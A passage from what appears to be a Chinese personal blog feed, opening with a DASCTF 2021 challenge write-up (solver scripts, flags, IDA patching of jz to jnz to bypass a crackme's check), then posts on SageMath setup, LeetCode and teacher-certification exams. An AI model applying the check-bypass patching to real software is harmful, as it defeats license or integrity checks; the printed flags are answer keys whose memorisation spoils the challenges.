class="keyword">def</span> <span class="title function_">transform2</span>(<span class="params">num</span>):</span><br><span class="line">    chinese_num = &#123;<span class="string">&#x27;零&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;壹&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;贰&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;叁&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;肆&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;伍&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;陆&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;柒&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;捌&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;玖&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> chinese_num[num]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(<span class="string">&#x27;Misc-Girlfriends_account-.xlsx&#x27;</span>)</span><br><span class="line">sheet = excel.sheet_by_index(<span class="number">0</span>)</span><br><span class="line">data1 = sheet.col_values(<span class="number">0</span>)[<span class="number">1</span>:]</span><br><span class="line">data2 = sheet.col_values(<span class="number">1</span>)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data1)):</span><br><span class="line">    tmp1 = <span class="built_in">round</span>(transform(data1[i]), <span class="number">2</span>)</span><br><span class="line">    tmp2 = transform2(data2[i])</span><br><span class="line">    total += Decimal(<span class="built_in">str</span>(tmp1)) * Decimal(<span class="built_in">str</span>(tmp2))</span><br><span class="line"><span class="built_in">print</span>(total)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12305926.36</span></span><br></pre></td></tr></table></figure><h3 id="双目失明，身残志坚"><a href="#双目失明，身残志坚" class="headerlink" title="双目失明，身残志坚"></a>双目失明，身残志坚</h3><p>先使用盲水印获得图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\bwmforpy3.py decode .\original.png .\blind.png flag.png</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210927091939797.png"></p><p>然后是盲文加密。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210927130130108.png" alt="盲文加密对照表"></p><p>搞错了不是这个，是【<strong>盲文拼音加密表</strong>】，我真服了。。。</p><p>关于拼音，有下面的<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">这篇博客</a>内有介绍。只能写出下面的这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zh e j iang g ong ie d a x ue</span><br></pre></td></tr></table></figure><p>应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zhejianggongyedaxue&#125;</span><br></pre></td></tr></table></figure><h3 id="ZipBomb"><a href="#ZipBomb" class="headerlink" title="ZipBomb"></a>ZipBomb</h3><p>没做出来，赛后抄的雪殇姐姐的脚本做出来的。雪殇姐姐的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dir_path=<span class="string">&#x27;C:\\Users\\Snowywar\\Desktop\\zipBomb&#x27;</span></span><br><span class="line">files= os.listdir(dir_path)</span><br><span class="line">newfiles = files[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(newfiles)</span><br><span class="line">setee = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> newfiles: <span class="comment">#遍历文件夹</span></span><br><span class="line">    position = dir_path+<span class="string">&#x27;\\&#x27;</span>+ file <span class="comment">#构造绝对路径，&quot;\\&quot;，其中一个&#x27;\&#x27;为转义符</span></span><br><span class="line">    <span class="built_in">print</span> (position)           </span><br><span class="line">    z = zipfile.ZipFile(position, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> z.namelist():</span><br><span class="line">        <span class="built_in">bytes</span> = z.read(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Zmxh&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure><p><strong>还没思路，有空再看</strong></p><h2 id="Reverse-赛后补打完"><a href="#Reverse-赛后补打完" class="headerlink" title="Reverse (赛后补打完)"></a>Reverse (赛后补打完)</h2><h3 id="ea5ycpp"><a href="#ea5ycpp" class="headerlink" title="ea5ycpp"></a>ea5ycpp</h3><p>这个题网上搜的wp上面说利用ida动态调试比较简单，但是我ida的动态调试还是不太熟，emmm，直接带上STL标准库一起分析就行了。其实稍微分析一下他的给出的数据就知道了，前面给的四个字符为<code>hoel</code>，写个脚本看看规律</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte = <span class="string">&#x27;hoel&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">ord</span>(flag[i]) - <span class="built_in">ord</span>(byte[i]))</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210927190350005.png"></p><p>七分逆向三分猜，忙碌了一天的我再次开始猜了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte = <span class="string">&#x27;hoel\x81iz=;yks89&#123;p&#123;Hs|\x85G|\x96&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(byte)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte[i]) - <span class="number">2</span> - i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;br41n_f**k_i5_go0d&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>简单的数学问题，直接用sympy库给解了，首先打开ida加载程序，找到关键函数的位置处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sub_411FA5(<span class="number">0x10</span>u);</span><br><span class="line">  sub_4121D5(v5, v11);</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v3 = sub_41257C(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, sub_412572);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 = <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, v30);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::ios_base::operator <span class="type">bool</span>(*(_DWORD *)(*(_DWORD *)v19 + <span class="number">4</span>) + v19) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4121B7(v30);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sub_411F28() != <span class="number">5</span> );</span><br><span class="line">  v29 = *(_QWORD *)sub_411F4B(<span class="number">1</span>);</span><br><span class="line">  v28 = *(_QWORD *)sub_411F4B(<span class="number">2</span>);</span><br><span class="line">  v27 = *(_QWORD *)sub_411F4B(<span class="number">3</span>);</span><br><span class="line">  v26 = *(_QWORD *)sub_411F4B(<span class="number">4</span>) - <span class="string">&#x27;flagU&#x27;</span>;</span><br><span class="line">  v25 = sub_41218F(v26, HIDWORD(v26));</span><br><span class="line">  <span class="keyword">if</span> ( sub_411F28() == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v29 - v25 == <span class="number">0x61536369217D</span>i64 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v28 - v25 == <span class="number">0x586531316F</span>i64 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v27 - v25 == <span class="number">0x5F3631626F4E</span>i64 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v25 + v27 + v28 + v29 == <span class="number">0xC121F9FCC23A</span>i64 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You are right!&quot;</span>);</span><br><span class="line">              <span class="comment">//.............................</span></span><br></pre></td></tr></table></figure><p>这里面给了几个数学公式，猜测将公式解出来即可得到flag，此处使用sympy脚本来解，脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v25, v27, v28, v29 = sympy.symbols(<span class="string">&quot;v25 v27 v28 v29&quot;</span>)</span><br><span class="line">res = sympy.solve(</span><br><span class="line">    [v29 - v25 - <span class="number">0x61536369217D</span>, v28 - v25 - <span class="number">0x586531316F</span>, v27 - v25 - <span class="number">0x5F3631626F4E</span>, v25 + v27 + v28 + v29 - <span class="number">0xC121F9FCC23A</span>],</span><br><span class="line">    [v25, v27, v28, v29]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(res.values()):</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(i))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;\x10\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">b&#x27;_F1boN&#x27;</span></span><br><span class="line"><span class="string">b&#x27;he11o&#x27;</span></span><br><span class="line"><span class="string">b&#x27;acci!&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>故flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11o_F1boNacci!&#125;</span><br></pre></td></tr></table></figure><h3 id="pig-brain-king"><a href="#pig-brain-king" class="headerlink" title="pig_brain_king"></a>pig_brain_king</h3><p>这题需要使用ida修改硬件编码来解决问题，首先就是一个程序逻辑的分析，这里有个判断的指令，估计接下来还有个跳转的指令，这里需要我们无论输入什么都给判断为正确即可，看看伪代码</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928150837849.png"></p><p>注意到这里有一个判断，下面必然对应着有一个跳转的汇编指令，直接TAB跳转到汇编指令界面，对这条汇编的硬编码进行一个修改。本来那里是jz指令，改为jnz指令即可。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928151105515.png"></p><p><strong>注：修改硬编码的方式为，首先Options -&gt; General</strong>作如下改动</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928165406139.png"></p><p><strong>将0改为16，然后找到要修改的汇编代码，在左边找到对应的十六进制编码，改一下对应的byte值就行了</strong></p><p>也可直接修改汇编代码，总之所有修改代码的地方就是<strong>Edit -&gt; patch program子选项下</strong>改完之后再在此子选项下Apply一下即可。</p><p>这里先把跳转那里改了，我们需要的是即使我们输入的不对也会被逻辑判断为对，差不多就是这么个意思。</p><p>我这里第一次改的没生效，再改了一次并截了个图。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928170800541.png"></p><p>注意是更改541行伪代码那里的if对应的跳转汇编指令，此处更改之后再次运行exe会发现我们输入的错误的会被判定为对，此时因为有1000层判断，这里我们直接开挂修改初始值</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928171427822.png"></p><p>将上面的3修改为1000试试。。。</p><p>emmm，好像不行，那这里的判断获取flag的条件应该就不是这个v280的数值。</p><p>那就直接不考虑这个麻烦的了，直接将sleep的那里的push汇编代码修改为0好眠即可跳过睡眠。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928172120279.png"></p><p>emmm，所以这个程序所有改动只有四处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">三处sleep的时间修改为0毫秒</span><br><span class="line">一处 jz指令 修改为 jnz指令</span><br></pre></td></tr></table></figure><p>然后再在记事本里面搞出来1000行东西，可以是1000个a，但是必须要有换行符。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928174425915.png"></p><p>我可以作证，到这真的有flag了。。。但是被*号给遮住了，这里要把<code>*号</code>修改为0。</p><p>找了半天发现”*”符号出现在下面这个函数里面</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928175233691.png"></p><hr><p>emmm，好像要修改前面声明的地方，需要直接双击字符即可跳转。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928180530048.png"></p><p>最终运行如下所示。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B//image-20210928180429201.png"></p><p>这波re属实简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0U_ar3_The_k1ng_0f_pig_bra1n!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在pycharm中配置sage</title>
      <link href="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/"/>
      <url>/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/</url>
      
        <content type="html"><![CDATA[<h2 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h2><h3 id="1-下载sage"><a href="#1-下载sage" class="headerlink" title="1.下载sage"></a>1.下载sage</h3><p>到<a href="https://mirrors.tuna.tsinghua.edu.cn/sagemath/win/index.html">官网</a>下载sage的下载器，我下载的是8.3版本的不带installer的那个。然后正常的安装步骤，先将sage的这个环境整好。</p><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setx Path <span class="string">&quot;%Path%;C:\Program Files\SageMath 8.3\runtime\opt\sagemath-8.3\local\lib;C:\Program Files\SageMath 8.3\runtime\opt\sagemath-8.3\local\bin;C:\Program Files\SageMath 8.3\runtime\bin;C:\Program Files\SageMath 8.3\runtime\lib\lapack&quot;</span></span><br><span class="line">setx SAGE_ROOT /opt/sagemath-8.3</span><br><span class="line">setx SAGE_LOCAL /opt/sagemath-8.3/local</span><br><span class="line">setx DOT_SAGE /dot_sage</span><br></pre></td></tr></table></figure><p>sage在pycharm里面流畅运行的最低保障。</p><h3 id="3-配置pycharm"><a href="#3-配置pycharm" class="headerlink" title="3.配置pycharm"></a>3.配置pycharm</h3><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage//image-20210811213453135.png"></p><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage//image-20210811213541048.png"></p><p>这样环境就好了，可以直接<code>from sage import *</code>了哈哈。</p><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage//image-20210811215823812.png"></p><p>但是3.6似乎没有预装甚么东西之类的，<strong>注意这里只能用python2.7</strong>。而后<code>frome sage.all import *</code>就可以正常使用了，但是pycharm还是会识别出错，不管他就行了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pyharm </tag>
            
            <tag> sage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode刷题python3版</title>
      <link href="/2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88/"/>
      <url>/2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><img src="/2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88//image-20210807142846750.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i]+nums[j]==target <span class="keyword">and</span> i != j:</span><br><span class="line">                    <span class="keyword">return</span> [i, j]</span><br></pre></td></tr></table></figure><h3 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h3>]]></content>
      
      
      
        <tags>
            
            <tag> python， 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教师资格证考试总结</title>
      <link href="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是教师资格证考试"><a href="#什么是教师资格证考试" class="headerlink" title="什么是教师资格证考试"></a>什么是教师资格证考试</h2><p><a href="https://baike.baidu.com/item/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81/3287811">教师资格证</a>考试，是由<a href="https://baike.baidu.com/item/%E6%95%99%E8%82%B2%E9%83%A8%E8%80%83%E8%AF%95%E4%B8%AD%E5%BF%83/5104094">教育部考试中心</a>官方设定的<a href="https://baike.baidu.com/item/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%80%83%E8%AF%95/4063442">教师资格考试</a>。</p><p>2012年之前，教师资格考试是由各省自行组织命题和考试。主要针对<a href="https://baike.baidu.com/item/%E9%9D%9E%E5%B8%88%E8%8C%83%E4%B8%93%E4%B8%9A/15529578">非师范专业</a>需要考取教师资格证的考生。（<strong>师范专业学校直接颁发教师资格证</strong>）</p><p>2012年后，教师资格考试纳入统考试点和省考相结合的模式。到2018年除了新疆，内蒙古，西藏三个地区外<strong>其他省份全部纳入了教师资格统考</strong>，由教育部考试中心出题，地方教育考试院主考。主要<strong>针对师范专业和非师范专业需要考取教师资格证的考生</strong>。</p><h2 id="报考条件"><a href="#报考条件" class="headerlink" title="报考条件"></a>报考条件</h2><p>符合以下基本条件的人员，可以报名参加教师资格考试：</p><p>1．具有中华人民共和国国籍；</p><p>2．遵守宪法和法律，热爱教育事业，具有良好的思想品德；</p><p>3．符合申请认定教师资格的体检标准；</p><p>4．符合《教师法》规定的学历要求。</p><p>（一）幼儿园教师资格，应当具备幼儿师范学校毕业及以上学历。</p><p>（二）小学教师资格，应当具备<a href="https://baike.baidu.com/item/%E4%B8%AD%E7%AD%89%E5%B8%88%E8%8C%83%E5%AD%A6%E6%A0%A1/4909468">中等师范学校</a>毕业及以上学历。</p><p>（三）初中教师资格，应当具备高等<a href="https://baike.baidu.com/item/%E5%B8%88%E8%8C%83%E4%B8%93%E7%A7%91%E5%AD%A6%E6%A0%A1/7881407">师范专科学校</a>或者其他大学专科毕业及以上学历。</p><p>（四）高级中学和<a href="https://baike.baidu.com/item/%E4%B8%AD%E7%AD%89%E8%81%8C%E4%B8%9A%E5%AD%A6%E6%A0%A1/7487709">中等职业学校</a>教师资格，应当具备高等师范院校本科或者大学本科毕业及以上学历。</p><p>（五）中等职业学校实习指导教师资格，应当具备中等职业学校毕业及以上学历，并应当具有相当助理工程师以上<a href="https://baike.baidu.com/item/%E4%B8%93%E4%B8%9A%E6%8A%80%E6%9C%AF%E8%81%8C%E5%8A%A1/6597015">专业技术职务</a>或中级以上工人技术等级。</p><p><strong>考生应在户籍(开封)、学籍(在哪上的大学就在哪考试)或人事关系(在哪工作就在哪考试)所在市州报名</strong>参加中小学教师资格考试。**普通高等学校毕业及其毕业前一年级学生(就是说大三大四的可以参加报考)**，以及在校<a href="https://baike.baidu.com/item/%E5%85%A8%E6%97%A5%E5%88%B6%E7%A0%94%E7%A9%B6%E7%94%9F/10588952">全日制研究生</a>，可凭学校学籍管理部门出具的在籍学习证明报考，在就读学校所在地报名参加中小学教师资格考试。</p><p>被撤销教师资格的，5年内不得报名参加考试；受到剥夺政治权利，或故意犯罪受到有期徒刑以上刑事处罚的，不得报名参加考试。曾参加教师资格考试有作弊行为的，按照《<a href="https://baike.baidu.com/item/%E5%9B%BD%E5%AE%B6%E6%95%99%E8%82%B2%E8%80%83%E8%AF%95%E8%BF%9D%E8%A7%84%E5%A4%84%E7%90%86%E5%8A%9E%E6%B3%95/6994647">国家教育考试违规处理办法</a>》(教育部令第33号，下同)的相关规定执行。</p><h2 id="统考地区"><a href="#统考地区" class="headerlink" title="统考地区"></a>统考地区</h2><p>北京、天津、河北、山西、辽宁、吉林、黑龙江、上海、江苏、浙江、安徽、福建、江西、山东、<strong>河南</strong>、湖南、湖北、广东、广西、海南、重庆、四川、贵州、云南、陕西、甘肃、宁夏、青海</p><p>本篇文章为针对统考地区的考试前的总结。</p><p>统考地区目前的考试内容如下：</p><blockquote><p>幼儿园：综合素质+保教知识与能力</p><p>小学：综合素质+教育教学知识与能力</p><p><strong>中学：综合素质+教育知识与能力+学科知识与能力</strong></p></blockquote><h2 id="关于考核的身体条件"><a href="#关于考核的身体条件" class="headerlink" title="关于考核的身体条件"></a>关于考核的身体条件</h2><p>“身体条件”应为教育教学能力的一部分，或者说是承担教育教学任务的“硬件”，因为教师(特别是小学和幼儿园教师)身体条件对教育教学效果有一定影响。《教师资格条例》第六条规定：“有教育教学能力应当包括符合国家规定的从事教育教学工作的身体条件。”教师身体条件主要是<strong>要求无传染性疾病，无精神病史，有完全的法律行为能力</strong>等。“身体条件”的具体标准参照师范教育类专业招生体检标准的有关规定执行。</p><h2 id="考试流程"><a href="#考试流程" class="headerlink" title="考试流程"></a>考试流程</h2><ol><li>考普通话证（语文老师要二级甲等以上(<strong>87分－91.99分之间</strong>)；其他科目要二级乙等以上(<strong>80分－86.99分之间</strong>） 一般3月到6月，9月到12月每个月可以考一次。</li><li>考心理学以及教育学（该考试半年一次，通常在3月和10月，  有效期要根据自己省份的规定，因此最好一次性通关；在考心理学和教育学时，就要报名好考试的等级——幼儿教师&#x2F;小学&#x2F;初中&#x2F;高中&amp;高职&#x2F;大学，你的学历一定要高你报名等级一级，如果你要教高中就一定要大专以上学历，另外大学教师证是提供给大学在职教师考的）(<strong>值得一提的是现在统考(国考)已经将这两门学科融入到了‘一次考试’的内容里面了，所以不用特殊报名，直接考笔试就OK了</strong>)</li><li>拿上你的以上三个证外加毕业证、身份证、体检，就可以去报名试讲——也就是“说课”，这个时候你要选好科目（就是要选好数学、语文之类的） 。说课一般是15分钟，考之前上网下一下模板。 在每年6月和11月，通过说课就可以拿证了。</li></ol><h2 id="考试时间安排"><a href="#考试时间安排" class="headerlink" 